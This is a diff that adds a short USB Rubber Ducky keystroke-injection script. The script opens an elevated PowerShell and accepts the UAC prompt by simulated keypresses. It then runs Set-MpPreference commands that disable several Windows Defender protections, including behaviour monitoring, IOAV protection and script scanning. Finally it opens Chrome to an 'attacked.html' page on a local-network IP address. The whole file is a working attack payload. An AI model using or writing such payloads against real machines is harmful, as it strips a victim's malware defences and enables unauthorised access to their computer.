@@ -1,0 +1,19 @@
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell  -Command "Start-Process powershell -Verb runAs"
+DELAY 500
+ENTER
+DELAY 1500
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 2000
+STRING Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true; Set-MpPreference -DisableScriptScanning $true
+ENTER
+DELAY 2000
+GUI r
+DELAY 1000
+STRING chrome http://192.168.1.144:8000/attacked.html
+ENTER
+DELAY 500
